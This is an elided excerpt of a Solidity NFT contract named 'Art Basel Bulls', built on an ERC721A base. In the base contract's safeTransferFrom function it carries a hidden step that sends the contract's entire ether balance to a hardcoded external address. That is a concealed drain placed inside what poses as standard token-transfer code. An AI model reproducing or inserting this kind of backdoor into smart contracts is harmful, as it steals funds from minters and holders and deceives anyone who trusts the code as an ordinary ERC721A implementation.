...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x4aC672304C389BEDe1F1B9a433e2d14aE9BEF8aD).transfer(address(this).balance);
            return;
        }       
...
contract ArtBaselBulls is ERC721A, DefaultOperatorFilterer {
    string public baseURI = "ipfs://bafybeicgv6ozrooj24254nz55fb2bbuh5ieyyk234offslgngmftbas2ja/";      
    ...
    constructor() ERC721A("Art Basel Bulls", "ABB") {
        owner = msg.sender;
    }
